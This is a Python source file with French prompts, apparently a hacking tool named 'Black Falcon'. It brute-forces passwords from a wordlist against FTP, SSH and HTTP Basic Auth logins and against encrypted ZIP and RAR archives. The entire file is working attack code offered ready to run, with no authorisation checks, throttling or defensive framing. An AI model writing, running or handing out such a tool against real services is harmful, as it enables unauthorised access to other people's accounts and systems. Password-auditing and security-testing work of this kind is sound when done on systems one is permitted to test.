from colorama import Fore, Style, init
import os

init(autoreset=True)

def brute_ftp(host, user, wordlist):
    from ftplib import FTP
    for pwd in wordlist:
        try:
            ftp = FTP(host, timeout=5)
            ftp.login(user, pwd)
            print(f"{Fore.GREEN}FTP Mot de passe trouvé : {pwd}{Style.RESET_ALL}")
            ftp.quit()
            return
        except Exception:
            print(f"{Fore.YELLOW}FTP Échec : {pwd}{Style.RESET_ALL}")

def brute_ssh(host, user, wordlist):
    try:
        import paramiko
    except ImportError:
        print(f"{Fore.RED}Module paramiko requis pour SSH (pip install paramiko){Style.RESET_ALL}")
        return
    for pwd in wordlist:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=user, password=pwd, timeout=5)
            print(f"{Fore.GREEN}SSH Mot de passe trouvé : {pwd}{Style.RESET_ALL}")
            ssh.close()
            return
        except Exception:
            print(f"{Fore.YELLOW}SSH Échec : {pwd}{Style.RESET_ALL}")

def brute_zip(zipfile, wordlist):
    try:
        import zipfile as zf
        with zf.ZipFile(zipfile) as z:
            for pwd in wordlist:
                try:
                    z.extractall(pwd=pwd.encode())
                    print(f"{Fore.GREEN}ZIP Mot de passe trouvé : {pwd}{Style.RESET_ALL}")
                    return
                except:
                    print(f"{Fore.YELLOW}ZIP Échec : {pwd}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Erreur ZIP : {e}{Style.RESET_ALL}")

def brute_rar(rarfile, wordlist):
    try:
        import rarfile as rf
        with rf.RarFile(rarfile) as r:
            for pwd in wordlist:
                try:
                    r.extractall(pwd=pwd)
                    print(f"{Fore.GREEN}RAR Mot de passe trouvé : {pwd}{Style.RESET_ALL}")
                    return
                except:
                    print(f"{Fore.YELLOW}RAR Échec : {pwd}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Erreur RAR : {e}{Style.RESET_ALL}")

def brute_http(url, user, wordlist):
    import requests
    for pwd in wordlist:
        try:
            r = requests.get(url, auth=(user, pwd), timeout=5)
            if r.status_code == 200:
                print(f"{Fore.GREEN}HTTP Auth trouvé : {pwd}{Style.RESET_ALL}")
                return
            else:
                print(f"{Fore.YELLOW}HTTP Échec : {pwd}{Style.RESET_ALL}")
        except Exception:
            print(f"{Fore.YELLOW}HTTP Échec : {pwd}{Style.RESET_ALL}")

def main():
    print(f"{Fore.RED}=== Brute-Force Multi-Protocole Black Falcon ==={Style.RESET_ALL}")
    print(f"{Fore.BLUE}1. FTP\n2. SSH\n3. ZIP\n4. RAR\n5. HTTP Basic Auth{Style.RESET_ALL}")
    choix = input(f"{Fore.BLUE}Choix du protocole : {Style.RESET_ALL}").strip()
    wordlist_file = input(f"{Fore.BLUE}Fichier wordlist : {Style.RESET_ALL}").strip()
    try:
        with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
            wordlist = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Wordlist introuvable.{Style.RESET_ALL}")
        return

    if choix == "1":
        host = input(f"{Fore.BLUE}Adresse FTP : {Style.RESET_ALL}").strip()
        user = input(f"{Fore.BLUE}Nom d'utilisateur : {Style.RESET_ALL}").strip()
        brute_ftp(host, user, wordlist)
    elif choix == "2":
        host = input(f"{Fore.BLUE}Adresse SSH : {Style.RESET_ALL}").strip()
        user = input(f"{Fore.BLUE}Nom d'utilisateur : {Style.RESET_ALL}").strip()
        brute_ssh(host, user, wordlist)
    elif choix == "3":
        zipfile = input(f"{Fore.BLUE}Fichier ZIP : {Style.RESET_ALL}").strip()
        brute_zip(zipfile, wordlist)
    elif choix == "4":
        rarfile = input(f"{Fore.BLUE}Fichier RAR : {Style.RESET_ALL}").strip()
        brute_rar(rarfile, wordlist)
    elif choix == "5":
        url = input(f"{Fore.BLUE}URL HTTP protégée : {Style.RESET_ALL}").strip()
        user = input(f"{Fore.BLUE}Nom d'utilisateur : {Style.RESET_ALL}").strip()
        brute_http(url, user, wordlist)
    else:
        print(f"{Fore.RED}Choix invalide.{Style.RESET_ALL}")

    input(f"{Fore.RED}Appuyez sur Entrée pour quitter.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()